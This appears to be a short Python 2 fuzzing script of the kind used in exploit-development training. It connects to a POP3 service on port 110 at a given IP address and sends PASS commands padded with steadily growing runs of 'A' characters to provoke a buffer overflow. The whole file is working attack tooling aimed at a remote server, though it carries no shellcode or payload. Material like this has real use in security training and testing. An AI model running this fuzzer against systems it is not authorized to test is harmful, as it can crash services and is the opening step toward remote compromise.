
#!/usr/bin/python
import socket
import sys

if len(sys.argv) != 2:
    print "\n[*] Usage: " + sys.argv[0] + " <ip_address>\n"
    sys.exit(0)

# Create an array of buffers, while incrementing them
buffer=["A"]
counter=100

while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter=counter+200

for string in buffer:
    print "Fuzzing PASS with %s byte(s)" % len(string)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect=s.connect((sys.argv[1],110))
    s.recv(1024)
    s.send("USER test\r\n")
    s.recv(1024)
    s.send("PASS " + string + " \r\n")
    s.send("QUIT\r\n")
    s.close()
